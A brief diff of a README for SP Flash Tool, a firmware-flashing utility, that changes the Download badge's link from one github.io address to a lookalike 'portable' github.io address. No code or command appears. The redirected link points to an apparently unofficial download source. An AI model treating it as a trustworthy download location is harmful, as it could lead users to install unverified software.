@@ -1,6 +1,6 @@
 # SP Flash Tool
 
-[![Download](https://img.shields.io/badge/Download-SP--Flash--Tool-blue?style=for-the-badge&logo=github)](https://sp-flash-tool.github.io/.github)
+[![Download](https://img.shields.io/badge/Download-SP--Flash--Tool-blue?style=for-the-badge&logo=github)](https://sp-flash-tool-portable.github.io/.github)
 
 ![SP Flash Tool Screenshot](https://miro.medium.com/1*UWiYWccHZf71d8TZRoY2QQ.jpeg)
 
